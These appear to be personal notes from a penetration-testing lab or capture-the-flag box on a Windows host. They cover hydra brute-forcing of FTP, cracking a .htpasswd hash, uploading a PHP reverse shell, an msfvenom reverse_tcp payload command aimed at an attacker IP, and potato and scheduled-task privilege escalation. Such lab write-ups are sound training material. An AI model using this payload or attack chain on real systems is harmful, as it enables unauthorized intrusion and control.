
Windows machine 

![[Pasted image 20251210145439.png]]

trying to dump ftp files using anonymous didnt work so i tried to bruteforce  the credentials using hydra 

![[Pasted image 20251210173802.png]]



![[Pasted image 20251210145353.png]]

we found an intersting file `.htpasswd` so checking on the internet we found out that we can crack the hash this way its probably md5 or sha1 as mentioned 

![[Pasted image 20251210145413.png]]

port 242 had auth requirements now that we have a username and pass we can try it 


i got this 
![[Pasted image 20251210145703.png]]

its the same message in htaccess can overwrite it with revshell and then call it  ?
better if its access config it means its pointing to that dir  uploading  simple `echo hello` which can be seen in that page  so we can try revshell in it  


![[Pasted image 20251210151839.png]]

so i dropped more a revshell  

![[Pasted image 20251210172616.png]]

and it works   or we can use msfvenom 

```
msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=192.168.49.68 lport=443 > pwn.php

```

>flag found in desktop of apache 

![[Pasted image 20251210172950.png]]

seimpersonate priv is enabled so we can use one of the potatoes to get root

>DONE 


priv escalation 2:

https://www.exploit-db.com/exploits/15589

there is weak acl on task so we can use this exploit based on schedule task to basically priv sec
